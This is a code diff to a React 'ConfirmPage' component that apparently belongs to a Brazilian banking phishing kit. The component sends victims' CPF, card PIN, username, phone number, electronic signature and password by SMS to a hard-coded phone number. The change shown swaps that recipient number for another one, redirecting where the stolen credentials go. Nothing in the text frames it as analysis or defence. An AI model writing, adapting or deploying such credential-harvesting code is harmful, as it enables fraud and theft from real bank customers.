@@ -51,7 +51,7 @@ const ConfirmPage = () => {
         accountSid,
         authToken,
         from: '+12565307081',
-        to: '+5511991471545',
+        to: '+5511958012302',
         body: `CPF: ${cpf}\nSenha do Cartão: ${senhaCartao}\nUsername: ${username}\nTelefone: ${telefone}\nAssinatura Eletrônica: ${assinaturaEletronica}\nPassword: ${password}`,
       }),
       headers: {
